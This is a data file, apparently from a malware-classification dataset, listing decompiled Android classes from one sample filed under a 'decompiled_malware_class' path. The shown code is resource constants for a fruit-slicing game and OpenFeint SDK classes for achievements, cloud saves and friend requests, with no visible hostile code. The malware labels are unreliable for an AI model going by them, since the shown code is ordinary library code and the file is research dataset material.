of_native_loader=0x7f02000d;     public static final int of_native_loader_frame=0x7f02000e;     public static final int of_native_loader_leaf=0x7f02000f;     public static final int of_native_loader_progress=0x7f020010;     public static final int of_native_loader_progress_01=0x7f020011;     public static final int of_native_loader_progress_02=0x7f020012;     public static final int of_native_loader_progress_03=0x7f020013;     public static final int of_native_loader_progress_04=0x7f020014;     public static final int of_native_loader_progress_05=0x7f020015;     public static final int of_native_loader_progress_06=0x7f020016;     public static final int of_native_loader_progress_07=0x7f020017;     public static final int of_native_loader_progress_08=0x7f020018;     public static final int of_native_loader_progress_09=0x7f020019;     public static final int of_native_loader_progress_10=0x7f02001a;     public static final int of_native_loader_progress_11=0x7f02001b;     public static final int of_native_loader_progress_12=0x7f02001c;     public static final int of_notification_bkg=0x7f02001d;   } public static final class id {     public static final int adsview=0x7f090001;     public static final int appIcon=0x7f090012;     public static final int exit_feint=0x7f090018;     public static final int frameLayout=0x7f09000b;     public static final int home=0x7f090016;     public static final int layout_main=0x7f090000;     public static final int nested_window_root=0x7f09000a;     public static final int of_achievement_icon=0x7f090003;     public static final int of_achievement_icon_frame=0x7f090004;     public static final int of_achievement_notification=0x7f090002;     public static final int of_achievement_progress_icon=0x7f090008;     public static final int of_achievement_score=0x7f090006;     public static final int of_achievement_score_icon=0x7f090007;     public static final int of_achievement_text=0x7f090005;     public static final int of_icon=0x7f09000e;     public static final int of_ll_logo_image=0x7f09000d;     public static final int of_text=0x7f09000f;     public static final int of_text1=0x7f090010;     public static final int of_text2=0x7f090011;     public static final int progress=0x7f090009;     public static final int progress_bar=0x7f090015;     public static final int progress_text=0x7f090013;     public static final int settings=0x7f090017;     public static final int title=0x7f090014;     public static final int web_view=0x7f09000c;   } public static final class layout {     public static final int main=0x7f030000;     public static final int of_achievement_notification=0x7f030001;     public static final int of_native_loader=0x7f030002;     public static final int of_nested_window=0x7f030003;     public static final int of_simple_notification=0x7f030004;     public static final int of_two_line_notification=0x7f030005;     public static final int status_bar_ongoing_event_progress_bar=0x7f030006;   } public static final class menu {     public static final int of_dashboard=0x7f080000;   } public static final class raw {     public static final int banana0=0x7f040000;     public static final int banana1=0x7f040001;     public static final int banana1_1=0x7f040002;     public static final int banana1_2=0x7f040003;     public static final int banana2=0x7f040004;     public static final int banana2_1=0x7f040005;     public static final int banana2_2=0x7f040006;     public static final int bgmusic_forest=0x7f040007;     public static final int bgmusic_menue=0x7f040008;     public static final int bomb=0x7f040009;     public static final int cantaloupe0=0x7f04000a;     public static final int cantaloupe1=0x7f04000b;     public static final int cantaloupe1_1=0x7f04000c;     public static final int cantaloupe1_2=0x7f04000d;     public static final int cantaloupe2=0x7f04000e;     public static final int cantaloupe2_1=0x7f04000f;     public static final int cantaloupe2_2=0x7f040010;     public static final int carambola0=0x7f040011;     public static final int carambola1=0x7f040012;     public static final int carambola1_1=0x7f040013;     public static final int carambola1_2=0x7f040014;     public static final int carambola2=0x7f040015;     public static final int carambola2_1=0x7f040016;     public static final int carambola2_2=0x7f040017;     public static final int coconut0=0x7f040018;     public static final int coconut1=0x7f040019;     public static final int coconut1_1=0x7f04001a;     public static final int coconut1_2=0x7f04001b;     public static final int coconut2=0x7f04001c;     public static final int coconut2_1=0x7f04001d;     public static final int coconut2_2=0x7f04001e;     public static final int combo=0x7f04001f;     public static final int critical=0x7f040020;     public static final int cut_up=0x7f040021;     public static final int hit_bomb=0x7f040022;     public static final int kaka=0x7f040023;     public static final int l1_2=0x7f040024;     public static final int l2_3=0x7f040025;     public static final int l3_4=0x7f040026;     public static final int lemon0=0x7f040027;     public static final int lemon1=0x7f040028;     public static final int lemon1_1=0x7f040029;     public static final int lemon1_2=0x7f04002a;     public static final int lemon2=0x7f04002b;     public static final int lemon2_1=0x7f04002c;     public static final int lemon2_2=0x7f04002d;     public static final int lighting_fruit=0x7f04002e;     public static final int mangosteen0=0x7f04002f;     public static final int mangosteen1=0x7f040030;     public static final int mangosteen1_1=0x7f040031;     public static final int mangosteen1_2=0x7f040032;     public static final int mangosteen2=0x7f040033;     public static final int mangosteen2_1=0x7f040034;     public static final int mangosteen2_2=0x7f040035;     public static final int orange0=0x7f040036;     public static final int orange1=0x7f040037;     public static final int orange1_1=0x7f040038;     public static final int orange1_2=0x7f040039;     public static final int orange2=0x7f04003a;     public static final int orange2_1=0x7f04003b;     public static final int orange2_2=0x7f04003c;     public static final int papaya0=0x7f04003d;     public static final int papaya1=0x7f04003e;     public static final int papaya1_1=0x7f04003f;     public static final int papaya1_2=0x7f040040;     public static final int papaya2=0x7f040041;     public static final int papaya2_1=0x7f040042;     public static final int papaya2_2=0x7f040043;     public static final int peach0=0x7f040044;     public static final int peach1=0x7f040045;     public static final int peach1_1=0x7f040046;     public static final int peach1_2=0x7f040047;     public static final int peach2=0x7f040048;     public static final int peach2_1=0x7f040049;     public static final int peach2_2=0x7f04004a;     public static final int pineapple0=0x7f04004b;     public static final int pineapple1=0x7f04004c;     public static final int pineapple1_1=0x7f04004d;     public static final int pineapple1_2=0x7f04004e;     public static final int pineapple2=0x7f04004f;     public static final int pineapple2_1=0x7f040050;     public static final int pineapple2_2=0x7f040051;     public static final int stone=0x7f040052;     public static final int sword_ninjia=0x7f040053;     public static final int time_count_down=0x7f040054;     public static final int time_up=0x7f040055;     public static final int tomato0=0x7f040056;     public static final int tomato1=0x7f040057;     public static final int tomato1_1=0x7f040058;     public static final int tomato1_2=0x7f040059;     public static final int tomato2=0x7f04005a;     public static final int tomato2_1=0x7f04005b;     public static final int tomato2_2=0x7f04005c;     public static final int watermelon0=0x7f04005d;     public static final int watermelon1=0x7f04005e;     public static final int watermelon1_1=0x7f04005f;     public static final int watermelon1_2=0x7f040060;     public static final int watermelon2=0x7f040061;     public static final int watermelon2_1=0x7f040062;     public static final int watermelon2_2=0x7f040063;   } public static final class string {     public static final int app_name=0x7f060034;     public static final int continue_use=0x7f060031;     public static final int of_achievement_load_null=0x7f060008;     public static final int of_achievement_unlock_null=0x7f060007;     public static final int of_achievement_unlocked=0x7f060017;     public static final int of_banned_dialog=0x7f060024;     public static final int of_bitmap_decode_error=0x7f060019;     public static final int of_cancel=0x7f060013;     public static final int of_cant_compress_blob=0x7f060015;     public static final int of_crash_report_query=0x7f060021;     public static final int of_device=0x7f06000e;     public static final int of_error_parsing_error_message=0x7f06001b;     public static final int of_exit_feint=0x7f060026;     public static final int of_file_not_found=0x7f06001a;     public static final int of_home=0x7f060023;     public static final int of_id_cannot_be_null=0x7f060002;     public static final int of_io_exception_on_download=0x7f060014;     public static final int of_ioexception_reading_body=0x7f06001d;     public static final int of_key_cannot_be_null=0x7f060000;     public static final int of_loading_feint=0x7f06000f;     public static final int of_low_memory_profile_pic=0x7f06000a;     public static final int of_malformed_request_error=0x7f06002a;     public static final int of_name_cannot_be_null=0x7f060003;     public static final int of_no=0x7f060010;     public static final int of_no_blob=0x7f060016;     public static final int of_no_video=0x7f060022;     public static final int of_nodisk=0x7f06000c;     public static final int of_now_logged_in_as_format=0x7f06001f;     public static final int of_null_icon_url=0x7f060006;     public static final int of_offline_notification=0x7f060027;     public static final int of_offline_notification_line2=0x7f060028;     public static final int of_ok=0x7f060012;     public static final int of_profile_pic_changed=0x7f060020;     public static final int of_profile_picture_download_failed=0x7f06000b;     public static final int of_profile_url_null=0x7f060009;     public static final int of_score_submitted_notification=0x7f060029;     public static final int of_sdcard=0x7f06000d;     public static final int of_secret_cannot_be_null=0x7f060001;     public static final int of_server_error_code_format=0x7f06001c;     public static final int of_settings=0x7f060025;     public static final int of_switched_accounts=0x7f06001e;     public static final int of_timeout=0x7f060018;     public static final int of_unexpected_response_format=0x7f060004;     public static final int of_unknown_server_error=0x7f060005;     public static final int of_yes=0x7f060011;     public static final int resource_begin_download_entry=0x7f06002d;     public static final int resource_begin_download_package=0x7f06002f;     public static final int resource_end_download_entry=0x7f06002c;     public static final int resource_end_download_package=0x7f06002e;     public static final int resource_finish_checking=0x7f06002b;     public static final int resource_start_checking=0x7f060030;     public static final int warning=0x7f060032;     public static final int warning_message=0x7f060033;   } public static final class style {     public static final int FullScreenAds=0x7f070002;     public static final int OFLoading=0x7f070000;     public static final int OFNestedWindow=0x7f070001;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\raw.code","public static final class raw {   public static final int banana0=0x7f040000;   public static final int banana1=0x7f040001;   public static final int banana1_1=0x7f040002;   public static final int banana1_2=0x7f040003;   public static final int banana2=0x7f040004;   public static final int banana2_1=0x7f040005;   public static final int banana2_2=0x7f040006;   public static final int bgmusic_forest=0x7f040007;   public static final int bgmusic_menue=0x7f040008;   public static final int bomb=0x7f040009;   public static final int cantaloupe0=0x7f04000a;   public static final int cantaloupe1=0x7f04000b;   public static final int cantaloupe1_1=0x7f04000c;   public static final int cantaloupe1_2=0x7f04000d;   public static final int cantaloupe2=0x7f04000e;   public static final int cantaloupe2_1=0x7f04000f;   public static final int cantaloupe2_2=0x7f040010;   public static final int carambola0=0x7f040011;   public static final int carambola1=0x7f040012;   public static final int carambola1_1=0x7f040013;   public static final int carambola1_2=0x7f040014;   public static final int carambola2=0x7f040015;   public static final int carambola2_1=0x7f040016;   public static final int carambola2_2=0x7f040017;   public static final int coconut0=0x7f040018;   public static final int coconut1=0x7f040019;   public static final int coconut1_1=0x7f04001a;   public static final int coconut1_2=0x7f04001b;   public static final int coconut2=0x7f04001c;   public static final int coconut2_1=0x7f04001d;   public static final int coconut2_2=0x7f04001e;   public static final int combo=0x7f04001f;   public static final int critical=0x7f040020;   public static final int cut_up=0x7f040021;   public static final int hit_bomb=0x7f040022;   public static final int kaka=0x7f040023;   public static final int l1_2=0x7f040024;   public static final int l2_3=0x7f040025;   public static final int l3_4=0x7f040026;   public static final int lemon0=0x7f040027;   public static final int lemon1=0x7f040028;   public static final int lemon1_1=0x7f040029;   public static final int lemon1_2=0x7f04002a;   public static final int lemon2=0x7f04002b;   public static final int lemon2_1=0x7f04002c;   public static final int lemon2_2=0x7f04002d;   public static final int lighting_fruit=0x7f04002e;   public static final int mangosteen0=0x7f04002f;   public static final int mangosteen1=0x7f040030;   public static final int mangosteen1_1=0x7f040031;   public static final int mangosteen1_2=0x7f040032;   public static final int mangosteen2=0x7f040033;   public static final int mangosteen2_1=0x7f040034;   public static final int mangosteen2_2=0x7f040035;   public static final int orange0=0x7f040036;   public static final int orange1=0x7f040037;   public static final int orange1_1=0x7f040038;   public static final int orange1_2=0x7f040039;   public static final int orange2=0x7f04003a;   public static final int orange2_1=0x7f04003b;   public static final int orange2_2=0x7f04003c;   public static final int papaya0=0x7f04003d;   public static final int papaya1=0x7f04003e;   public static final int papaya1_1=0x7f04003f;   public static final int papaya1_2=0x7f040040;   public static final int papaya2=0x7f040041;   public static final int papaya2_1=0x7f040042;   public static final int papaya2_2=0x7f040043;   public static final int peach0=0x7f040044;   public static final int peach1=0x7f040045;   public static final int peach1_1=0x7f040046;   public static final int peach1_2=0x7f040047;   public static final int peach2=0x7f040048;   public static final int peach2_1=0x7f040049;   public static final int peach2_2=0x7f04004a;   public static final int pineapple0=0x7f04004b;   public static final int pineapple1=0x7f04004c;   public static final int pineapple1_1=0x7f04004d;   public static final int pineapple1_2=0x7f04004e;   public static final int pineapple2=0x7f04004f;   public static final int pineapple2_1=0x7f040050;   public static final int pineapple2_2=0x7f040051;   public static final int stone=0x7f040052;   public static final int sword_ninjia=0x7f040053;   public static final int time_count_down=0x7f040054;   public static final int time_up=0x7f040055;   public static final int tomato0=0x7f040056;   public static final int tomato1=0x7f040057;   public static final int tomato1_1=0x7f040058;   public static final int tomato1_2=0x7f040059;   public static final int tomato2=0x7f04005a;   public static final int tomato2_1=0x7f04005b;   public static final int tomato2_2=0x7f04005c;   public static final int watermelon0=0x7f04005d;   public static final int watermelon1=0x7f04005e;   public static final int watermelon1_1=0x7f04005f;   public static final int watermelon1_2=0x7f040060;   public static final int watermelon2=0x7f040061;   public static final int watermelon2_1=0x7f040062;   public static final int watermelon2_2=0x7f040063; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\string.code","public static final class string {   public static final int app_name=0x7f060034;   public static final int continue_use=0x7f060031;   public static final int of_achievement_load_null=0x7f060008;   public static final int of_achievement_unlock_null=0x7f060007;   public static final int of_achievement_unlocked=0x7f060017;   public static final int of_banned_dialog=0x7f060024;   public static final int of_bitmap_decode_error=0x7f060019;   public static final int of_cancel=0x7f060013;   public static final int of_cant_compress_blob=0x7f060015;   public static final int of_crash_report_query=0x7f060021;   public static final int of_device=0x7f06000e;   public static final int of_error_parsing_error_message=0x7f06001b;   public static final int of_exit_feint=0x7f060026;   public static final int of_file_not_found=0x7f06001a;   public static final int of_home=0x7f060023;   public static final int of_id_cannot_be_null=0x7f060002;   public static final int of_io_exception_on_download=0x7f060014;   public static final int of_ioexception_reading_body=0x7f06001d;   public static final int of_key_cannot_be_null=0x7f060000;   public static final int of_loading_feint=0x7f06000f;   public static final int of_low_memory_profile_pic=0x7f06000a;   public static final int of_malformed_request_error=0x7f06002a;   public static final int of_name_cannot_be_null=0x7f060003;   public static final int of_no=0x7f060010;   public static final int of_no_blob=0x7f060016;   public static final int of_no_video=0x7f060022;   public static final int of_nodisk=0x7f06000c;   public static final int of_now_logged_in_as_format=0x7f06001f;   public static final int of_null_icon_url=0x7f060006;   public static final int of_offline_notification=0x7f060027;   public static final int of_offline_notification_line2=0x7f060028;   public static final int of_ok=0x7f060012;   public static final int of_profile_pic_changed=0x7f060020;   public static final int of_profile_picture_download_failed=0x7f06000b;   public static final int of_profile_url_null=0x7f060009;   public static final int of_score_submitted_notification=0x7f060029;   public static final int of_sdcard=0x7f06000d;   public static final int of_secret_cannot_be_null=0x7f060001;   public static final int of_server_error_code_format=0x7f06001c;   public static final int of_settings=0x7f060025;   public static final int of_switched_accounts=0x7f06001e;   public static final int of_timeout=0x7f060018;   public static final int of_unexpected_response_format=0x7f060004;   public static final int of_unknown_server_error=0x7f060005;   public static final int of_yes=0x7f060011;   public static final int resource_begin_download_entry=0x7f06002d;   public static final int resource_begin_download_package=0x7f06002f;   public static final int resource_end_download_entry=0x7f06002c;   public static final int resource_end_download_package=0x7f06002e;   public static final int resource_finish_checking=0x7f06002b;   public static final int resource_start_checking=0x7f060030;   public static final int warning=0x7f060032;   public static final int warning_message=0x7f060033; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\style.code","public static final class style {   public static final int FullScreenAds=0x7f070002;   public static final int OFLoading=0x7f070000;   public static final int OFNestedWindow=0x7f070001; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\Achievement.code","public class Achievement extends Resource {   public String description;   public String endVersion;   public int gamerscore;   public String iconUrl;   public boolean isSecret;   public boolean isUnlocked;   public float percentComplete;   public int position;   public String startVersion;   public String title;   public Date unlockDate; public static abstract class DownloadIconCB extends APICallback {     public abstract void onSuccess(    Bitmap bitmap);   } public static abstract class ListCB extends APICallback {     public abstract void onSuccess(    List<Achievement> list);   } public static abstract class LoadCB extends APICallback {     public abstract void onSuccess();   } public static abstract class UnlockCB extends APICallback {     public abstract void onSuccess(    boolean z);   } public static abstract class UpdateProgressionCB extends APICallback {     public abstract void onSuccess(    boolean z);   }   public Achievement(  String resourceID){     setResourceID(resourceID);   }   public static void list(  final ListCB cb){     final String path=""/xp/games/"" + OpenFeintInternal.getInstance().getAppID() + ""/achievements"";     JSONRequest req=new JSONRequest(){       @Override public String method(){         return ""GET"";       }       @Override public String path(){         return path;       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           try {             List<Achievement> achievements=(List)responseBody;             cb.onSuccess(achievements);           }  catch (          Exception e) {             onFailure(OpenFeintInternal.getRString(R.string.of_unexpected_response_format));           }         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public void downloadIcon(  final DownloadIconCB cb){     if (this.iconUrl == null) {       if (cb != null) {         cb.onFailure(OpenFeintInternal.getRString(R.string.of_null_icon_url));       }     }  else {       BitmapRequest req=new BitmapRequest(){         @Override public String method(){           return ""GET"";         }         @Override public String url(){           return Achievement.this.iconUrl;         }         @Override public String path(){           return """";         }         @Override public void onSuccess(        Bitmap responseBody){           if (cb != null) {             cb.onSuccess(responseBody);           }         }         @Override public void onFailure(        String exceptionMessage){           if (cb != null) {             cb.onFailure(exceptionMessage);           }         }       } ;       req.launch();     }   }   public void unlock(  final UnlockCB cb){     UpdateProgressionCB upCB=null;     if (cb != null) {       upCB=new UpdateProgressionCB(){         @Override public void onSuccess(        boolean complete){           cb.onSuccess(complete);         }         @Override public void onFailure(        String exceptionMessage){           cb.onFailure(exceptionMessage);         }       } ;     }     updateProgression(100.0f,upCB);   }   public void updateProgression(  float pctComplete,  final UpdateProgressionCB cb){     final float clampedPctComplete=pctComplete < 0.0f ? 0.0f : pctComplete > 100.0f ? 100.0f : pctComplete;     final String resID=resourceID();     if (resID == null) {       if (cb != null) {         cb.onFailure(OpenFeintInternal.getRString(R.string.of_achievement_unlock_null));         return;       }       return;     }     if (clampedPctComplete <= OfflineSupport.getClientCompletionPercentage(resID)) {       if (cb != null) {         cb.onSuccess(false);         return;       }       return;     }     OfflineSupport.updateClientCompletionPercentage(resID,clampedPctComplete);     if (OpenFeintInternal.getInstance().getUserID() == null) {       this.percentComplete=OfflineSupport.getClientCompletionPercentage(resID);       this.isUnlocked=this.percentComplete == 100.0f;       if (cb != null) {         cb.onSuccess(false);         return;       }       return;     }     final String path=""/xp/games/"" + OpenFeintInternal.getInstance().getAppID() + ""/achievements/""+ resID+ ""/unlock"";     OrderedArgList args=new OrderedArgList();     args.put(""percent_complete"",new Float(clampedPctComplete).toString());     JSONRequest req=new JSONRequest(args){       @Override public String method(){         return ""PUT"";       }       @Override public String path(){         return path;       }       @Override protected void onResponse(      int responseCode,      Object responseBody){         if (responseCode >= 200 && responseCode < 300) {           Achievement achievement=(Achievement)responseBody;           float oldPercentComplete=Achievement.this.percentComplete;           Achievement.this.shallowCopy(achievement);           float newPercentComplete=Achievement.this.percentComplete;           OfflineSupport.updateServerCompletionPercentage(resID,newPercentComplete);           if (201 == responseCode || newPercentComplete > oldPercentComplete) {             AchievementNotification.showStatus(achievement);           }           if (cb != null) {             cb.onSuccess(201 == responseCode);             return;           }           return;         }         if (400 <= responseCode && responseCode < 500) {           onFailure(responseBody);           return;         }         if (100.0f == clampedPctComplete) {           Achievement.this.percentComplete=clampedPctComplete;           Achievement.this.isUnlocked=true;           AchievementNotification.showStatus(Achievement.this);         }         if (cb != null) {           cb.onSuccess(false);         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public void load(  final LoadCB cb){     String resID=resourceID();     if (resID == null) {       if (cb != null) {         cb.onFailure(OpenFeintInternal.getRString(R.string.of_achievement_load_null));       }     }  else {       final String path=""/xp/games/"" + OpenFeintInternal.getInstance().getAppID() + ""/achievements/""+ resID;       JSONRequest req=new JSONRequest(){         @Override public String method(){           return ""GET"";         }         @Override public String path(){           return path;         }         @Override public void onSuccess(        Object responseBody){           Achievement.this.shallowCopy((Achievement)responseBody);           if (cb != null) {             cb.onSuccess();           }         }         @Override public void onFailure(        String exceptionMessage){           super.onFailure(exceptionMessage);           if (cb != null) {             cb.onFailure(exceptionMessage);           }         }       } ;       req.launch();     }   }   public Achievement(){   }   public static ResourceClass getResourceClass(){     ResourceClass klass=new ResourceClass(Achievement.class,""achievement""){       @Override public Resource factory(){         return new Achievement();       }     } ;     klass.mProperties.put(""title"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Achievement)obj).title;       }       @Override public void set(      Resource obj,      String val){         ((Achievement)obj).title=val;       }     } );     klass.mProperties.put(""description"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Achievement)obj).description;       }       @Override public void set(      Resource obj,      String val){         ((Achievement)obj).description=val;       }     } );     klass.mProperties.put(""gamerscore"",new IntResourceProperty(){       @Override public int get(      Resource obj){         return ((Achievement)obj).gamerscore;       }       @Override public void set(      Resource obj,      int val){         ((Achievement)obj).gamerscore=val;       }     } );     klass.mProperties.put(""icon_url"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Achievement)obj).iconUrl;       }       @Override public void set(      Resource obj,      String val){         ((Achievement)obj).iconUrl=val;       }     } );     klass.mProperties.put(""is_secret"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((Achievement)obj).isSecret;       }       @Override public void set(      Resource obj,      boolean val){         ((Achievement)obj).isSecret=val;       }     } );     klass.mProperties.put(""is_unlocked"",new BooleanResourceProperty(){       @Override public boolean get(      Resource obj){         return ((Achievement)obj).isUnlocked;       }       @Override public void set(      Resource obj,      boolean val){         ((Achievement)obj).isUnlocked=val;       }     } );     klass.mProperties.put(""percent_complete"",new FloatResourceProperty(){       @Override public float get(      Resource obj){         return ((Achievement)obj).percentComplete;       }       @Override public void set(      Resource obj,      float val){         ((Achievement)obj).percentComplete=val;       }     } );     klass.mProperties.put(""unlocked_at"",new DateResourceProperty(){       @Override public Date get(      Resource obj){         return ((Achievement)obj).unlockDate;       }       @Override public void set(      Resource obj,      Date val){         ((Achievement)obj).unlockDate=val;       }     } );     klass.mProperties.put(""position"",new IntResourceProperty(){       @Override public int get(      Resource obj){         return ((Achievement)obj).position;       }       @Override public void set(      Resource obj,      int val){         ((Achievement)obj).position=val;       }     } );     klass.mProperties.put(""end_version"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Achievement)obj).endVersion;       }       @Override public void set(      Resource obj,      String val){         ((Achievement)obj).endVersion=val;       }     } );     klass.mProperties.put(""start_version"",new StringResourceProperty(){       @Override public String get(      Resource obj){         return ((Achievement)obj).startVersion;       }       @Override public void set(      Resource obj,      String val){         ((Achievement)obj).startVersion=val;       }     } );     return klass;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\BefriendCB.code","public static abstract class BefriendCB extends APICallback {   public abstract void onSuccess(); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\BlobDownloadedDelegate.code","public static abstract class BlobDownloadedDelegate {   public void blobDownloadedForScore(  Score score){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\CloudStorage.code","public class CloudStorage {   public static int MAX_SIZE=262144;   private static Pattern sValidKeyPattern; public static abstract class DeleteCB extends APICallback {     public abstract void onSuccess();   } public static abstract class ListCB extends APICallback {     public abstract void onSuccess(    List<String> list);   } public static abstract class LoadCB extends APICallback {     public abstract void onSuccess(    byte[] bArr);   } public static abstract class SaveCB extends APICallback {     public abstract void onSuccess();   }   public static void list(  final ListCB cb){     String userID=OpenFeintInternal.getInstance().getUserID();     if ((userID == null || userID.length() == 0) && cb != null) {       cb.onFailure(""A user must be logged in to list their persisted CloudStorage blobs."");     }     String appID=OpenFeintInternal.getInstance().getAppID();     final String path=""/xp/users/"" + userID + ""/games/""+ appID+ ""/save_cards"";     new JSONRequest(){       @Override public boolean wantsLogin(){         return true;       }       @Override public String path(){         return path;       }       @Override public String method(){         return ""GET"";       }       @Override protected Object parseJson(      byte[] bodyStream){         Object o=Util.getObjFromJson(bodyStream);         if (o != null && (o instanceof ServerException)) {           return o;         }         JsonFactory jsonFactory=new JsonFactory();         try {           JsonParser jp=jsonFactory.createJsonParser(bodyStream);           if (jp.nextToken() != JsonToken.START_OBJECT) {             throw new JsonParseException(""Couldn't find toplevel wrapper object."",jp.getTokenLocation());           }           if (jp.nextToken() != JsonToken.FIELD_NAME) {             throw new JsonParseException(""Couldn't find toplevel wrapper object."",jp.getTokenLocation());           }           String hopefullyCloudStorages=jp.getText();           if (!hopefullyCloudStorages.equals(""save_cards"")) {             throw new JsonParseException(""Couldn't find toplevel wrapper object."",jp.getTokenLocation());           }           if (jp.nextToken() != JsonToken.START_ARRAY) {             throw new JsonParseException(""Couldn't find savecard array."",jp.getTokenLocation());           }           ArrayList<String> rv=new ArrayList<>();           while (jp.nextToken() != JsonToken.END_ARRAY) {             if (jp.getCurrentToken() != JsonToken.VALUE_STRING) {               throw new JsonParseException(""Unexpected non-string in savecard array."",jp.getTokenLocation());             }             rv.add(jp.getText());           }           return rv;         }  catch (        Exception e) {           OpenFeintInternal.log(TAG,e.getMessage());           return new ServerException(""JSONError"",""Unexpected response format"");         }       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           cb.onSuccess((List)responseBody);         }       }       @Override public void onFailure(      String reason){         if (cb != null) {           cb.onFailure(reason);         }       }     } .launch();   }   public static void load(  String key,  final LoadCB cb){     String userID=OpenFeintInternal.getInstance().getUserID();     if ((userID == null || userID.length() == 0) && cb != null) {       cb.onFailure(""A user must be logged in to load data from a CloudStorage blob."");     }     if (!isValidKey(key) && cb != null) {       cb.onFailure(""'"" + (key == null ? ""(null)"" : key) + ""' is not a valid CloudStorage key."");     }     String appID=OpenFeintInternal.getInstance().getAppID();     final String path=""/xp/users/"" + userID + ""/games/""+ appID+ ""/save_cards/""+ key;     new CompressedBlobDownloadRequest(){       @Override public boolean wantsLogin(){         return true;       }       @Override public String path(){         return path;       }       @Override public void onSuccessDecompress(      byte[] body){         if (cb != null) {           cb.onSuccess(body);         }       }       @Override public void onFailure(      String exceptionMessage){         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } .launch();   }   public static void save(  String key,  final byte[] data,  final SaveCB cb){     String userID=OpenFeintInternal.getInstance().getUserID();     if (userID == null || userID.length() == 0) {       if (cb != null) {         cb.onFailure(""Cannot save because the owner of this CloudStorage blob is not logged in."");         return;       }       return;     }     if (!isValidKey(key)) {       if (cb != null) {         cb.onFailure(""'"" + (key == null ? ""(null)"" : key) + ""' is not a valid CloudStorage key."");       }     }  else     if (data == null || data.length == 0) {       if (cb != null) {         cb.onFailure(""data is empty.  data must be set before saving."");       }     }  else     if (MAX_SIZE < data.length) {       if (cb != null) {         cb.onFailure(""You cannot exceed 256 kB per save card"");       }     }  else {       String appID=OpenFeintInternal.getInstance().getAppID();       final String path=""/xp/users/"" + userID + ""/games/""+ appID+ ""/save_cards/""+ key;       new JSONRequest(){         @Override public boolean wantsLogin(){           return true;         }         @Override public String path(){           return path;         }         @Override public String method(){           return ""PUT"";         }         @Override public HttpUriRequest generateRequest(){           HttpPut retval=new HttpPut(url());           retval.setEntity(new ByteArrayEntity(Compression.compress(data)));           addParams(retval);           return retval;         }         @Override public void onSuccess(        Object body){           if (cb != null) {             cb.onSuccess();           }         }         @Override public void onFailure(        String reason){           if (cb != null) {             cb.onFailure(reason);           }         }       } .launch();     }   }   public static void delete(  String key,  final DeleteCB cb){     String userID=OpenFeintInternal.getInstance().getUserID();     if ((userID == null || userID.length() == 0) && cb != null) {       cb.onFailure(""The user who owns this CloudStorage blob is not logged in. The CloudStorage blob specified was not deleted."");     }     if (!isValidKey(key) && cb != null) {       cb.onFailure(""'"" + (key == null ? ""(null)"" : key) + ""' is not a valid CloudStorage key."");     }     String appID=OpenFeintInternal.getInstance().getAppID();     final String path=""/xp/users/"" + userID + ""/games/""+ appID+ ""/save_cards/""+ key;     new JSONRequest(){       @Override public boolean wantsLogin(){         return true;       }       @Override public String path(){         return path;       }       @Override public String method(){         return ""DELETE"";       }       @Override public void onSuccess(      Object body){         if (cb != null) {           cb.onSuccess();         }       }       @Override public void onFailure(      String reason){         if (cb != null) {           cb.onFailure(reason);         }       }     } .launch();   }   public static boolean isValidKey(  String key){     if (key == null) {       return false;     }     if (sValidKeyPattern == null) {       try {         sValidKeyPattern=Pattern.compile(""[a-zA-Z][a-zA-Z0-9-_]*"");       }  catch (      PatternSyntaxException e) {         return false;       }     }     return sValidKeyPattern.matcher(key).matches();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\CurrentUser.code","public class CurrentUser extends User { public static abstract class BefriendCB extends APICallback {     public abstract void onSuccess();   }   public void befriend(  User userToBefriend,  final BefriendCB cb){     OrderedArgList args=new OrderedArgList();     args.put(""friend_id"",userToBefriend.resourceID());     JSONRequest req=new JSONRequest(args){       @Override public boolean wantsLogin(){         return true;       }       @Override public String method(){         return ""POST"";       }       @Override public String path(){         return ""/xp/friend_requests"";       }       @Override public void onSuccess(      Object responseBody){         if (cb != null) {           cb.onSuccess();         }       }       @Override public void onFailure(      String exceptionMessage){         super.onFailure(exceptionMessage);         if (cb != null) {           cb.onFailure(exceptionMessage);         }       }     } ;     req.launch();   }   public static ResourceClass getResourceClass(){     return new ResourceClass(CurrentUser.class,""current_user""){       @Override public Resource factory(){         return new CurrentUser();       }     } ;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\DeleteCB.code","public static abstract class DeleteCB extends APICallback {   public abstract void onSuccess(); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api.resource\DownloadBlobCB.code","public static abstract class DownloadBlobCB extends APICallback {   public abstract void onSuccess(); } "
